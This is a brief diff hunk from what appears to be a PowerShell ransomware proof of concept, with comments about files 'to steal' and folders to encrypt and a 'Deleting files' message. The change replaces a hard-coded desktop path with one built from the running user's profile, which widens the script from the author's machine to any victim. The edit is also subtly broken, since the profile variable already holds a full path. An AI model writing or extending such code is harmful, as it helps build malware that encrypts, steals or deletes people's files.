@@ -120,8 +120,8 @@ Write-Host "[-] Deleting files" -ForegroundColor Red
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Files to steal?
 #----------------------------------------------------------------------------------------------------------------------------------------
-$Source = "C:\Users\Hunter\Desktop"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
-$Destination = "C:\Users\Hunter\Desktop\cifrado" 
+$Source = "C:\Users\$env:USERPROFILE\Desktop"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Destination = "C:\Users\$env:USERPROFILE\Desktop\cifrado" 
 
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Red}
